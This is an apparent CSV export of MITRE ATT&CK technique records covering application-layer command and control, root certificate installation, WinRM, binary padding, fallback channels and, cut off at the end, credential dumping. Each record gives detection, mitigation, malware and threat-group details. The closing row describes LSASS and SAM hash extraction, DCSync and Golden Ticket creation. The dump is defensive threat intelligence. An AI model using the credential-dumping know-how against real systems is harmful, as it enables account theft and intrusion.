1398,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0050|CosmicDuke]] can use HTTP or HTTPS for command and control to hard-coded C2 servers.[[CiteRef::F-Secure The Dukes]][[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1399,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['One variant of [[Software/S0054|CloudDuke]] uses HTTP and HTTPS for C2.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CloudDuke, MiniDionis, CloudLook",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1400,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0049|GeminiDuke]] uses HTTP and HTTPS for command and control.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: GeminiDuke,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1401,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0051|MiniDuke]] uses HTTP and HTTPS for command and control.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: MiniDuke,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1402,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0052|OnionDuke]] uses HTTP and HTTPS for C2.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: OnionDuke,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1403,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0053|SeaDuke]] uses HTTP and HTTPS for C2.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1404,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use HTTP or DNS for command and control.[[CiteRef::Dell TG-3390]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1405,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0064|ELMER]] uses HTTP for command and control.[[CiteRef::FireEye EPS Awakens Part 2]]'],['APT16'],['APT16'],['G0023'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ELMER,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1406,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use HTTP or DNS for command and control.[[CiteRef::Dell TG-3390]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1407,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0144|ChChes]] communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::JPCERT ChChes Feb 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1408,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can communicate to its C2 over HTTP and HTTPS if directed.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1409,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0159|SNUGRIDE]] communicates with its C2 server over HTTP.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SNUGRIDE,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1410,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0062|DustySky]] has used both HTTP and HTTPS for C2.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: DustySky, NeD Worm",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1411,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use HTTP or DNS for command and control.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1412,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] has used HTTP, HTTPS, and DNS for command and control.[[CiteRef::ThreatStream Evasion Analysis]][[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1413,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0072|OwaAuth]] uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: OwaAuth,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1414,"[""A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present.""]",['Digital Certificate Validation'],[],"['Itzik Kotler, SafeBreach']","['SSL/TLS inspection', 'Digital Certificate Logs']",['[[Software/S0148|RTM]] can add a certificate to the Windows store.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],['HTTP Public Key Pinning (HPKP) is one method to mitigate potential man-in-the-middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate.[[CiteRef::Wikipedia HPKP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']",['Administrator'],[],Software: RTM,['Defense Evasion'],['Technique/T1130'],['Install Root Certificate'],https://attack.mitre.org/wiki/Technique/T1130
1415,"['Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.']",[],[],[],"['File monitoring', 'Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']","['Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[[CiteRef::Microsoft WinRM]] It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell.[[CiteRef::Jacobsen 2014]]']",[],[],[],"['Disable the WinRM service. If the service is necessary, lock down critical enclaves with separate WinRM infrastructure, accounts, and permissions. Follow WinRM best practices on configuration of authentication methods and use of host firewalls to restrict WinRM access to allow communication only to/from specific devices.[[CiteRef::NSA Spotting]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['WinRM listener turned on and configured on remote system'],[],"['Execution', 'Lateral Movement']",Technique/T1028,['Windows Remote Management'],https://attack.mitre.org/wiki/Technique/T1028
1416,"['Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. \n\nWhen executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information [[Discovery]] or [[Lateral Movement]], which could be used as event indicators that point to the source file.']","['Anti-virus', 'Signature-based detection']",['572'],[],[],['Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.'],[],[],[],"['Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],Technique/T1009,['Binary Padding'],https://attack.mitre.org/wiki/Technique/T1009
1417,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.'],[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1008,['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
1418,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['Credential dumping is the process of obtaining account login and password information from the operating system and software. Credentials can be used to perform [[Lateral Movement]] and access restricted information.\n\nTools may dump credentials in many different ways: extracting credential hashes for offline cracking, extracting plaintext passwords, and extracting Kerberos tickets, among others. Examples of credential dumpers include pwdump7, [[Software/S0005|Windows Credential Editor]], [[Software/S0002|Mimikatz]], and [[Software/S0008|gsecdump]]. These tools are in use by both professional security testers and adversaries.\n\nPlaintext passwords can be obtained using tools such as [[Software/S0002|Mimikatz]] to extract passwords stored by the Local Security Authority (LSA). If smart cards are used to authenticate to a domain using a personal identification number (PIN), then that PIN is also cached as a result and may be dumped.[[CiteRef::Github Mimikatz Module sekurlsa]]\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. The action works by simulating a domain controller replication process from a remote domain controller, which may contain various pieces of information included in Active Directory such as passwords, historical hashes, and current hashes of potentially useful accounts, such as the KRBTGT account NTLM hash. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data.[[CiteRef::ADSecurity Mimikatz DCSync]] The hashes can then in turn be used to create a Golden Ticket for use in [[Technique/T1097|Pass the Ticket]].[[CiteRef::Harmj0y Mimikatz and DCSync]] DCSync functionality has been included in the ""lsadump"" module in Mimikatz.[[CiteRef::GitHub Mimikatz lsadump Module]]']",[],[],[],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],Technique/T1003,['Credential 